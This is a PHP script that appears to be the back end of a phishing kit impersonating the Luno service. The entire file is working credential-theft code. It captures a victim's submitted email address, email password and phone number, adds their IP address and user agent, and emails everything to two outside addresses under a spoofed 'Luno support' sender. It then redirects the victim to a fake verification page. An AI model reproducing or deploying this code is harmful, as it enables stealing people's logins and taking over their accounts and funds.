<?php
if($_POST["email"] != "" and $_POST["emailpassword"] != ""){
date_default_timezone_set("Africa/Johannesburg");
$ip = $_SERVER['REMOTE_ADDR'];
	$time = time();
	$date = date("Y-m-d H:i:s");
	$ccn = $_POST['email'];
$ip = getenv("REMOTE_ADDR");
$hostname .= gethostbyaddr($ip);
$useragent .= $_SERVER['HTTP_USER_AGENT'];
$message .= '<html>
<head></head>
                    <body>
                        <table style="">
                            <tr>
                                <td style="font-weight: bold">Email Addres:</td>
                                <td style="padding-left: 1em;">'.$_POST['email'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">Email Password:</td>
                                <td style="padding-left: 1em;">'.$_POST['emailpassword'].'</td>
                            </tr>
							 <tr>
                                <td style="font-weight: bold">Mobile Number:</td>
                                <td style="padding-left: 1em;">'.$_POST['contact'].'</td>
                            </tr>
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
							<tr>
							<td style="font-weight: bold">User Agent:</td>
							<td style="padding-left: 1em;">'.$useragent.'</td></tr>
                        </table>
                    </body>
                </html>';
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|-----------Don Money-------------|\n";

   $from = "Luno 3rd <support@".$_SERVER['HTTP_HOST'].">";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "Luno Email n Pass Result [$ccn] [$ip] [$date]";
        if(mail("jackythiuli@gmail.com,thulisiben@yandex.com",$subject,$message,$headers))
	
			$praga=rand();
$praga=md5($praga);
  header ("Location: verification1.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
